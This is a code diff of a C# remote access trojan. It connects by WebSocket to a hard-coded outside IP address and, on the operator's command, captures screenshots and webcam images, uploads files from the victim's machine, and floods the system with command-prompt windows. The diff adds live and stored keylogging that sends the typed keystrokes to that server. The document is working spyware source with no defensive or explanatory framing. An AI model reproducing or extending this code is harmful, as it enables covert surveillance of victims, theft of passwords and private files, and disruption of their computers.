@@ -7,39 +7,34 @@ using System.IO;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
 using Emgu.CV;
-using System.Collections.Generic;
-using System.Text;
-using System.Runtime.InteropServices;
+using Keystroke.API;
 
 namespace A3
 {
     class Program
     {
-        private const int WH_KEYBOARD_LL = 13;
-        private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
-        private static IntPtr _hookID = IntPtr.Zero;
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        static bool logging = false;
+        static bool livelogging = true;
+        static bool neverLogged = true;
+        static bool neverLiveLogged = true;
+        static string logged = "";
+        static string liveCharacter = "";
+        static string lastLiveCharacter = "";
 
         static void Main(string[] args)
         {
-            _hookID = SetHook(_proc);
-            UnhookWindowsHookEx(_hookID);
+
+            Thread myThread1;
+            myThread1 = new Thread(new ThreadStart(connection));
+            myThread1.Start();
+    
+        }
+
+        public static void connection(){
+
             using (var ws = new WebSocket("ws://154.49.211.230:4422"))
             {
+
                 ws.OnMessage += (sender, e) =>
                 {
                     String message;
@@ -54,15 +49,77 @@ namespace A3
                         Size s = new Size(memoryImage.Width, memoryImage.Height);
                         Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                         memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
-                        
+
                         MemoryStream stream = new MemoryStream();
                         memoryImage.Save(stream, ImageFormat.Bmp);
                         byte[] imageBytes = stream.ToArray();
                         string base64String = Convert.ToBase64String(imageBytes);
-                        ws.Send("##SCREENSHOT##"+ base64String);
+                        ws.Send("##SCREENSHOT##" + base64String);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                     }
-                    else if(message == "webcam_snap")
+                    else if (message == "keylogger live")
+                    {
+                        livelogging = true;
+                        if (neverLiveLogged)
+                        {
+                            neverLiveLogged = false;
+                            new Thread(() =>
+                            {
+                                using (var api = new KeystrokeAPI())
+                                {
+                                    api.CreateKeyboardHook((character) =>
+                                    {
+                                        if (livelogging)
+                                        {
+                                            ws.Send("##LIVEKEYS##" + character.ToString());
+                                        }
+                                    });
+                                }
+                                Application.Run();
+                            }).Start();
+                        }
+                    }
+                    else if (message == "keylogger start")
+                    {
+                        logging = true;
+                        livelogging = false;
+                        if (neverLogged)
+                        {
+                            neverLogged = false;
+                            new Thread(() =>
+                            {
+                                using (var api = new KeystrokeAPI())
+                                {
+                                    api.CreateKeyboardHook((character) =>
+                                    {
+                                        if (logging)
+                                        {
+                                            logged += character;
+                                        }
+                                    });
+                                }
+                                Application.Run();
+                            }).Start();
+                        }
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+
+                    }
+                    else if (message == "keylogger dump")
+                    {
+                        ws.Send("##LOGGED##" + logged);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+
+                    }
+                    else if (message == "keylogger stop")
+                    {
+                        ws.Send("##LOGGED##" + logged);
+                        logging = false;
+                        livelogging = false;
+                        logged = "";
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+
+                    }
+                    else if (message == "webcam_snap")
                     {
                         VideoCapture capture = new VideoCapture();
                         Bitmap image = capture.QueryFrame().Bitmap;
@@ -70,18 +127,21 @@ namespace A3
                         image.Save(ms, ImageFormat.Jpeg);
                         byte[] byteImage = ms.ToArray();
                         var SigBase64 = Convert.ToBase64String(byteImage);
-                        ws.Send("##WEBCAM_SNAP##"+SigBase64);
+                        ws.Send("##WEBCAM_SNAP##" + SigBase64);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
-                    }else if(message.StartsWith("crash_pc"))
+                    }
+                    else if (message.StartsWith("crash_pc"))
                     {
-                        int times = System.Convert.ToInt32(message.Replace("crash_pc ",""));
-                        for(int s = 0; s < times; s++){
+                        int times = System.Convert.ToInt32(message.Replace("crash_pc ", ""));
+                        for (int s = 0; s<times; s++)
+                        {
                             Process cmd = new Process();
                             cmd.StartInfo.FileName = "cmd.exe";
                             cmd.Start();
                         }
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
-                    }else if(message == "speedtest")
+                    }
+                    else if (message == "speedtest")
                     {
                         const string tempfile = "tempfile.tmp";
                         System.Net.WebClient webClient = new System.Net.WebClient();
@@ -91,21 +151,26 @@ namespace A3
 
                         FileInfo fileInfo = new FileInfo(tempfile);
                         long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
-                        string jj = "{\"duration\":\""+ sww.Elapsed.Milliseconds+"\",\"file_size\":\""+ fileInfo.Length.ToString("N0")+"\",\"speed\":\""+ speed.ToString("N0")+"\"}";
+                        string jj = "{\"duration\":\"" + sww.Elapsed.Milliseconds + "\",\"file_size\":\"" + fileInfo.Length.ToString("N0") + "\",\"speed\":\"" + speed.ToString("N0") + "\"}";
                         ws.Send("##SPEEDTEST##" + jj);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
-                    }else if(message == "SENDHELLO"){
+                    }
+                    else if (message == "SENDHELLO")
+                    {
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                     }
-                    else if(message.StartsWith("upload_file"))
-                    {   
-                        string filepath = message.Replace("upload_file ","");
-                        if (System.IO.File.Exists(filepath)){
+                    else if (message.StartsWith("upload_file"))
+                    {
+                        string filepath = message.Replace("upload_file ", "");
+                        if (System.IO.File.Exists(filepath))
+                        {
                             FileInfo info = new FileInfo(filepath);
                             ws.Send("##FILENAME##" + filepath);
                             ws.Send(info);
                             ws.Send("hello ##" + Environment.CurrentDirectory + "##");
-                        }else{
+                        }
+                        else
+                        {
                             ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exists !\"}");
                             ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                         }
@@ -133,7 +198,7 @@ namespace A3
                     sw.Start();
                     while (true)
                     {
-                        if(sw.ElapsedMilliseconds > 2000)
+                        if (sw.ElapsedMilliseconds > 2000)
                         {
                             ws.Connect();
                             ws.Send("hello ##" + Environment.CurrentDirectory + "##");
@@ -141,34 +206,13 @@ namespace A3
                         }
                     }
                 };
+                
                 ws.Connect();
                 ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                 new ManualResetEvent(false).WaitOne();
-            }
-        }
 
-        private static IntPtr SetHook(LowLevelKeyboardProc proc)
-        {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
-            {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
             }
-        }
 
-        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-        {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
-            {
-                int vkCode = Marshal.ReadInt32(lParam);
-
-                if ((Keys)vkCode == Keys.PrintScreen)
-                {
-                    //CaptureScreen();
-                }
-                Console.WriteLine((Keys)vkCode);
-            }
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
     }
